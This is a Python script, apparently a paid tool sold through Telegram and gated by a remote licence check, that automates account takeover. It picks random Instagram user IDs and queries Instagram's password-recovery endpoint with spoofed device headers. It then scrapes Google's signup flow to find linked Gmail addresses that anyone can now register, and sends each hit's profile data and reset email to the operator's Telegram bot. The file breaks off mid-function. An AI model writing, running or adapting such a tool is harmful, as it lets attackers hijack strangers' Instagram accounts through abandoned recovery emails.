import os
import time
import json
import uuid
import base64
import random
import hashlib
import inspect
import re
import webbrowser
import string
import sys
from datetime import datetime, timedelta
from threading import Thread
from random import choice as cc, randrange as rr
import requests
import pytz
from user_agent import generate_user_agent as ggb
from requests import post as pp, get
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# ========== REMOTE EXPIRY CONFIGURATION ==========
REMOTE_URL = "https://raw.githubusercontent.com/LEVIXX797/1/main/Acess.txt"
EXPIRE_MSG = (
    f"\n{Fore.LIGHTRED_EX}{Style.BRIGHT}[‚úñ] FILE ACCESS DENIED\n"
    f"{Fore.YELLOW}{Style.BRIGHT}>>> FILE HAS BEEN TERMINATED\n"
    f"{Fore.CYAN}>>> CONTACT {Fore.MAGENTA}@GL1T5  OR VEERU {Fore.CYAN}FOR RENEW\n"
)

def progress_bar(task="Processing", duration=2):
    """Simple progress bar"""
    for i in range(21):
        percent = int((i/20) * 100)
        bar = "‚ñà" * i + "-" * (20 - i)
        sys.stdout.write(f"\r{task}: |{bar}| {percent}%")
        sys.stdout.flush()
        time.sleep(duration / 20)
    print()  # New line after finish

def fetch_id_data():
    try:
        progress_bar("Fetching Data", 2)
        response = requests.get(REMOTE_URL, timeout=3)
        response.raise_for_status()
        return [line.strip() for line in response.text.strip().splitlines() if "|" in line]
    except Exception as e:
        print(f"\033[1m[‚ùå] Error fetching data:\033[0m {e}")
        return []

def check_id_validity(input_id):
    input_id = input_id.strip()
    data = fetch_id_data()

    progress_bar("Verifying ID", 2)

    for record in data:
        try:
            id_val, expiry = map(str.strip, record.split("|"))
            if id_val == input_id:
                expiry_dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry_dt:
                    remaining_time = expiry_dt - datetime.now()
                    hrs, rem = divmod(remaining_time.seconds, 3600)
                    mins, secs = divmod(rem, 60)
                    print(f"\033[1m\n[‚úÖ] Valid ID. Access expires in {hrs}h {mins}m {secs}s.\033[0m")
                    print(f"\033[1m[‚è≥] Expiry Date & Time: {expiry_dt}\033[0m")
                    return True
                else:
                    print("\033[1m\n[‚õî] This ID has expired. Renew your subscription via @GL1T5\033[0m")
                    return False
        except Exception as err:
            print(f"\033[1m[‚ö†Ô∏è] Invalid record skipped:\033[0m {record} ‚Äî {err}")

    print("\033[1m\n[‚ö†Ô∏è] You are not a paid user. Buy a subscription ~ @GL1T5 (TG)\033[0m")
    return False

# ========== PROFESSIONAL CONFIGURATION ==========
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    MAGENTA = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    GRAY = '\033[1;90m'
    RESET = '\033[0m'
    
    # Premium colors
    GOLD = '\033[38;5;220m'
    SILVER = '\033[38;5;248m'
    PLATINUM = '\033[38;5;255m'
    
    # Rainbow colors for premium effect
    RAINBOW = ['\033[38;5;196m', '\033[38;5;202m', '\033[38;5;226m', 
               '\033[38;5;46m', '\033[38;5;21m', '\033[38;5;93m', '\033[38;5;201m']

class Styles:
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'

class Animations:
    @staticmethod
    def typing_effect(text, delay=0.03):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()

    @staticmethod
    def rainbow_text(text):
        rainbow_str = ""
        for i, char in enumerate(text):
            color = Colors.RAINBOW[i % len(Colors.RAINBOW)]
            rainbow_str += f"{color}{char}"
        return rainbow_str + Colors.RESET
@staticmethod
    def premium_loading(text="Loading", duration=2, color=Colors.GOLD):
        """Premium ‚ñ∞‚ñ± Progress Bar Animation"""
        steps = 25
        for i in range(steps + 1):
            progress = i / steps
            filled_blocks = int(progress * 15)
            empty_blocks = 15 - filled_blocks
            
            filled = "‚ñà" * filled_blocks
            empty = "‚ñë" * empty_blocks
            bar = f"{color}{filled}{Colors.GRAY}{empty}{Colors.RESET}"
            
            percentage = int(progress * 100)
            spinner = "‚£æ‚£Ω‚£ª‚¢ø‚°ø‚£ü‚£Ø‚£∑"[i % 8]
            print(f"\r{spinner} {text} {bar} {percentage}%", end="", flush=True)
            time.sleep(duration / steps)
        
        print(f"\r{Colors.GREEN}‚úÖ {text} Completed Successfully!{' ' * 30}{Colors.RESET}")

    @staticmethod
    def scanning_animation(text="Scanning", duration=2):
        """Premium Scanning Animation"""
        frames = [
            "üîÑ Scanning Databases", 
            "üîç Analyzing Profiles", 
            "üìä Checking Metrics", 
            "‚ö° Processing Data",
            "üéØ Targeting Users"
        ]
        
        for i in range(len(frames)):
            progress = (i + 1) * 20
            bar = "‚ñà" * (i + 1) + "‚ñë" * (5 - i - 1)
            print(f"\r{Colors.CYAN}{frames[i]} [{bar}] {progress}%{Colors.RESET}", end="", flush=True)
            time.sleep(duration / len(frames))
        print(f"\r{Colors.GREEN}‚úÖ Scanning System Ready!{' ' * 30}{Colors.RESET}")

    @staticmethod
    def processing_animation(text="Processing", duration=2):
        """Premium Processing Animation"""
        symbols = ["‚£æ", "‚£Ω", "‚£ª", "‚¢ø", "‚°ø", "‚£ü", "‚£Ø", "‚£∑"]
        end_time = time.time() + duration
        i = 0
        
        while time.time() < end_time:
            symbol = symbols[i % len(symbols)]
            print(f"\r{Colors.YELLOW}{symbol} {text}{Colors.RESET}", end="", flush=True)
            time.sleep(0.1)
            i += 1
        print(f"\r{Colors.GREEN}‚úÖ {text} Completed!{' ' * 30}{Colors.RESET}")

    @staticmethod
    def system_initialization():
        """Professional System Initialization Sequence"""
        steps = [
            ("Initializing Security Protocols", 1),
            ("Loading Scanner Engine", 1.5),
            ("Configuring API Connections", 1),
            ("Setting Up Database", 1),
            ("Optimizing Performance", 1.5),
            ("Finalizing Setup", 1)
        ]
        
        total_steps = len(steps)
        current_step = 0
        
        for step_name, step_duration in steps:
            current_step += 1
            progress = int((current_step / total_steps) * 100)
            bar_length = 30
            filled = int(bar_length * current_step / total_steps)
            bar = f"{Colors.GREEN}‚ñà" * filled + f"{Colors.GRAY}‚ñë" * (bar_length - filled)
            
            print(f"\r[{bar}] {progress}% | {step_name}", end="", flush=True)
            time.sleep(step_duration)
        
        print(f"\r{Colors.GREEN}[‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà] 100% | System Ready!{' ' * 20}{Colors.RESET}")
        return True

# ========== PREMIUM KEY VERIFICATION ==========
def verify_premium_access():
    print(f"\n{Colors.CYAN}‚îå‚îÄ({Colors.GOLD}PREMIUM ACCESS{Colors.CYAN}){Colors.RESET}")
    print(f"{Colors.CYAN}‚îî‚îÄ‚îÄ‚û§ {Colors.YELLOW}üîê Enter Premium Key: {Colors.RESET}", end="")
    
    user_key = input().strip()

    if user_key == "VEERU_1K_COMPLETE":
        Animations.processing_animation("Validating Premium Credentials", 2)
        
        print(f"\n{Colors.GREEN}üéâ PREMIUM ACCESS GRANTED!{Colors.RESET}")
        print(f"{Colors.GOLD}‚ú® Welcome to VEERU PAID FILE{Colors.RESET}")
        print(f"{Colors.CYAN}üìÖ Access Type: Premium file {Colors.RESET}")
        print(f"{Colors.GREEN}‚úÖ Status: Active & Ready{Colors.RESET}")
return True
    else:
        print(f"\n{Colors.RED}üö´ ACCESS DENIED!{Colors.RESET}")
        print(f"{Colors.RED}‚ùå Invalid Premium Key{Colors.RESET}")
        print(f"{Colors.YELLOW}üí° Contact @GL1T5 or VEERU for premium access{Colors.RESET}")
        return False

# ========== COLORFUL DISPLAY FUNCTIONS ==========
def display_banner():
    banner = f"""
{Colors.RAINBOW[0]}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
{Colors.RAINBOW[1]}‚ïë                                                              ‚ïë
{Colors.RAINBOW[2]}‚ïë  {Colors.GOLD} ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó            ‚ïë
{Colors.RAINBOW[3]}‚ïë  {Colors.GOLD} ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë            ‚ïë
{Colors.RAINBOW[4]}‚ïë  {Colors.GOLD} ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë            ‚ïë
{Colors.RAINBOW[5]}‚ïë  {Colors.GOLD} ‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë            ‚ïë
{Colors.RAINBOW[6]}‚ïë  {Colors.GOLD}  ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù            ‚ïë
{Colors.RAINBOW[0]}‚ïë  {Colors.GOLD}   ‚ïö‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù             ‚ïë
{Colors.RAINBOW[1]}‚ïë                                                              ‚ïë
{Colors.RAINBOW[2]}‚ïë         {Colors.CYAN}·¥ò Ä·¥á·¥ç…™·¥ú·¥ç  ·¥õ·¥è·¥è ü                        ‚ïë
{Colors.RAINBOW[3]}‚ïë               {Colors.MAGENTA}·¥õ·¥è·¥è ü  ô è ·¥†·¥á·¥á Ä·¥ú & …¢ ü1·¥õ5              ‚ïë
{Colors.RAINBOW[4]}‚ïë                                                              ‚ïë
{Colors.RAINBOW[5]}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
{Colors.RESET}"""
    print(banner)

def display_stats():
    """Display colorful statistics"""
    global total, hits, bad_gm, bad_mail, goodig
    
    # Create a beautiful stats display
    stats_box = f"""
{Colors.CYAN}‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ {Colors.GOLD}üìä LIVE STATISTICS {Colors.CYAN}‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
{Colors.CYAN}‚îÇ                                                  ‚îÇ
{Colors.CYAN}‚îÇ  {Colors.GREEN}‚úÖ HITS FOUND:    {Colors.WHITE}{hits:>8}               {Colors.CYAN}‚îÇ
{Colors.CYAN}‚îÇ  {Colors.RED}‚ùå BAD ACCOUNTS:  {Colors.WHITE}{bad_gm:>8}               {Colors.CYAN}‚îÇ
{Colors.CYAN}‚îÇ  {Colors.YELLOW}‚ö†Ô∏è BAD EMAILS:   {Colors.WHITE}{bad_mail:>8}               {Colors.CYAN}‚îÇ
{Colors.CYAN}‚îÇ  {Colors.BLUE}üìß GOOD IG:      {Colors.WHITE}{goodig:>8}               {Colors.CYAN}‚îÇ
{Colors.CYAN}‚îÇ  {Colors.MAGENTA}üìà TOTAL SCANNED: {Colors.WHITE}{total:>8}               {Colors.CYAN}‚îÇ
{Colors.CYAN}‚îÇ                                                  ‚îÇ
{Colors.CYAN}‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
{Colors.RESET}"""
    print(stats_box)

def colorful_pppp():
    """Enhanced colorful display function"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display banner
    display_banner()
    
    # Display statistics in a beautiful box
    display_stats()
    
    # Footer with rainbow effect
    footer = f"""
{Colors.RAINBOW[0]}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
{Colors.RAINBOW[1]}‚ïë    {Animations.rainbow_text("‚ô° 1Ôº´ Ôº≥Ôº∞Ôº•Ôº£Ôº©Ôº°Ôº¨  ‚ô°  ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç «´·¥ú·¥Ä ü…™·¥õ è  ‚ô°")}     ‚ïë
{Colors.RAINBOW[2]}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
{Colors.RESET}"""
    print(footer)

# ========== MAIN CODE EXECUTION ==========
def main():
    # Run system initialization
    Animations.system_initialization()
    
    # Display welcome banner
    display_banner()
    
    # First check user ID validity from GitHub
    print(f"\n{Colors.CYAN}‚îå‚îÄ({Colors.GOLD}USER ID VERIFICATION{Colors.CYAN}){Colors.RESET}")
    user_id = input(f"{Colors.YELLOW}‚îî‚îÄ‚îÄ‚û§ üë§ Enter Your User ID: {Colors.RESET}")
    
    if not check_id_validity(user_id):
        sys.exit(1)
    
    print(f"\n{Colors.GREEN}{Styles.BOLD}[üöÄ] Access verified. Welcome!{Colors.RESET}")
    
    # Verify premium access
    if not verify_premium_access():
        sys.exit(1)
# Continue with the rest of the code
    print(f"\n{Colors.CYAN}‚îå‚îÄ({Colors.GOLD}BOT CONFIGURATION{Colors.CYAN}){Colors.RESET}")
    Token = input(f"{Colors.YELLOW}‚îî‚îÄ‚îÄ‚û§ ü§ñ Telegram Bot Token: {Colors.RESET}")
    ID = input(f"{Colors.YELLOW}‚îî‚îÄ‚îÄ‚û§ üë§ Your Telegram ID: {Colors.RESET}")
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Global variables
    global total, hits, bad_gm, bad_mail, goodig, infoinsta
    total = 0
    hits = 0
    bad_gm = 0
    bad_mail = 0
    goodig = 0
    infoinsta = {}
    
    yy = 'azertyuiopmlkjhgfdsqwxcvbn'
    
    def tll():
        try:
            n1 = ''.join(cc(yy) for i in range(rr(6,9)))
            n2 = ''.join(cc(yy) for i in range(rr(3,9)))
            host = ''.join(cc(yy) for i in range(rr(15,30)))
            he3 = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': str(ggb())
            }
            res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
            tok_match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
            if tok_match:
                tok = tok_match.group(2)
                cookies = {'__Host-GAPS': host}
                headers = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
                    'user-agent': ggb()
                }
                data = {
                    'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
                }
                response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers, data=data)
                if response.text:
                    tl = str(response.text).split('",null,"')[1].split('"')[0]
                    host = response.cookies.get_dict().get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(f"{tl}//{host}\n")
        except Exception as e:
            print(f"{Colors.RED}Error in tll: {e}{Colors.RESET}")
            tll()
    
    tll()
    
    def check_gmail(email):
        global bad_mail, hits
        try:
            if '@' in email:
                email = str(email).split('@')[0]
            try:
                o = open('tl.txt', 'r').read().splitlines()[0]
            except:
                o = open('tl.txt', 'r').read().splitlines()[0]
            
            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
'user-agent': ggb()
            }
            params = {'TL': tl}
            data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
            response = pp('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data)
            
            if '"gf.uar",1' in str(response.text):
                hits += 1
                colorful_pppp()
                if '@' not in email:
                    ok = email + '@gmail.com'
                    username, gg = ok.split('@')
                    InfoAcc(username, gg)
                else:
                    username, gg = email.split('@')
                    InfoAcc(username, gg)
            else:
                bad_mail += 1
                colorful_pppp()
        except Exception as e:
            print(f"{Colors.RED}Error in check_gmail: {e}{Colors.RESET}")
    
    def check(email):
        global goodig, bad_gm
        ua = ggb()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            'User-Agent': ua,
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            }),
            'ig_sig_key_version': '4'
        }
        try:
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
            if email in response:
                if '@gmail.com' in email:
                    check_gmail(email)
                goodig += 1
                colorful_pppp()
            else:
                bad_gm += 1
                colorful_pppp()
        except Exception as e:
            print(f"{Colors.RED}Error in check: {e}{Colors.RESET}")
            bad_gm += 1
            colorful_pppp()
    
    def rest(user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356'
            }
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + user + '"}',
                'ig_sig_key_version': '4'
            }
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).json()
            r = response.get('email', 'bad')
        except:
            r = 'bad'
        return r
    
    def date(Id):
        try:
            uid = int(Id)
            if 1 < uid < 1279000:
                return 2010
            elif 1279001 <= uid < 17750000:
                return 2011
            elif 17750001 <= uid < 279760000:
                return 2012
            elif 279760001 <= uid < 900990000:
                return 2013
            elif 900990001 <= uid < 1629010000:
                return 2014
            elif 1900000000 <= uid < 2500000000:
                return 2015
            elif 2500000000 <= uid < 3713668786:
                return 2016
            elif 3713668786 <= uid < 5699785217:
                return 2017
            elif 5699785217 <= uid < 8507940634:
                return 2018
            elif 8507940634 <= uid < 21254029834:
                return 2019
            else:
                return '2020-2023'
        except Exception:
            return ''
    
    def InfoAcc(username, gg):
        global total
        rr = infoinsta.get(username, {})
        Id = rr.get('pk', None)
        full_name = rr.get('full_name', None)
        fows = rr.get('follower_count', None)
        fowg = rr.get('following_count', None)
        pp = rr.get('media_count', None)
        isPraise = rr.get('is_private', None)
        bio = rr.get('biography', None)
        is_verified = rr.get('is_verified', None)
        bizz = rr.get('is_business', None)
        
        try:
            if fows and pp:
                if int(fows) >= 10 and int(pp) >= 2:
                    meta = True
                else:
                    meta = False
            else:
                meta = False
        except:
            meta = False
        
        total += 1
        reset_email = rest(username)
        
        if reset_email.endswith('@gmail.com'):
            email = f"{username}@gmail.com"
        elif reset_email.endswith('@a**.com') or reset_email.endswith('@aol.com'):
            email = f"{username}@aol.com"
        else:
            email = f"{username}"
        
        # Enhanced colorful output
        ss = f"""
‚öôÔ∏è„Äê·¥õ·¥è·¥è ü  ô è ·¥†·¥á·¥á Ä·¥ú „Äë‚öôÔ∏è
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë®‚Äçüíº …¥·¥Ä·¥ç·¥á       :: {full_name}
ü™™ ·¥ús·¥á Ä…¥·¥Ä·¥ç·¥á    :: @{username}
üìß ·¥á·¥ç·¥Ä…™ ü      :: {email}
üìä “ì·¥è ü ü·¥è·¥°·¥á Äs   :: {fows}
üìâ “ì·¥è ü ü·¥è·¥°…™…¥…¢  :: {fowg}
üéûÔ∏è ·¥ò·¥ès·¥õs      :: {pp}
üìù  ô…™·¥è        :: {bio}
üîê ·¥ò Ä…™·¥†·¥Ä·¥õ·¥á    :: {isPraise}
üÜî …™·¥Ö         :: {Id}
üìÖ  è·¥á·¥Ä Ä       :: {date(Id)}
üèÖ ·¥ç·¥á·¥õ·¥Ä       :: {meta}
üåê ·¥ò Ä·¥è“ì…™ ü·¥á   :: https://www.instagram.com/{username}
‚ôªÔ∏è  Ä·¥ás·¥á·¥õ      :: {reset_email}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üíª Ôº¥ÔºØÔºØÔº¨ Ôº¢Ôºπ ‚û§ @GL1T5 X @vpxfil
"""
        inline_keyboard = [[{'text': 'Developer', 'url': 'https://t.me/GL1T5'}, {'text': 'Join Channel', 'url': 'https://t.me/GLITCH_ARMY'}]]
        payload = {
            'chat_id': ID,
            'text': ss,
            'reply_markup': json.dumps({'inline_keyboard': inline_keyboard})
        }
        try:
            requests.post(f"https://api.telegram.org/bot{Token}/sendMessage", data=payload)
        except Exception as e:
print(f"{Colors.RED}Error sending message: {e}{Colors.RESET}")
    
    def safe_int_input(prompt, default):
        try:
            value = input(prompt).strip()
            return int(value) if value else default
        except:
            return default
    
    ranges = {
        1: (1279001, 17750000),
        2: (17750000, 279760000),
        3: (279760000, 900990000),
        4: (900990000, 1629010000),
        5: (1629010000, 2500000000),
        6: (2500000000, 3713668786),
        7: (3713668786, 5699785217),
        8: (5699785217, 8507940634),
        9: (8507940634, 21254029834)
    }
    
    print(f'\n{Colors.CYAN}‚îå‚îÄ({Colors.GOLD}YEAR SELECTION{Colors.CYAN}){Colors.RESET}')
    print(f'{Colors.CYAN}‚îÇ {Colors.YELLOW}Select a year for user ID range:{Colors.RESET}')
    for k in range(1, 10):
        print(f"{Colors.CYAN}‚îÇ {Colors.WHITE}{k} - {Colors.CYAN}{2010 + k}{Colors.RESET}")
    
    year_choice = safe_int_input(f'{Colors.CYAN}‚îî‚îÄ‚îÄ‚û§ {Colors.YELLOW}Enter Your Choice (1-9): {Colors.RESET}', 5)
    
    def generate_user_id():
        start, end = ranges.get(year_choice, ranges[5])
        return str(random.randrange(start, end))
    
    def gg(min_followers, min_posts, user_id_func):
        while True:
            try:
                user_id = user_id_func()
                model_number = str(random.randint(150, 999))
                android_version = random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
                dpi = str(random.randint(100, 1300))
                resolution = f"{random.randint(200, 2000)}x{random.randint(200, 2000)}"
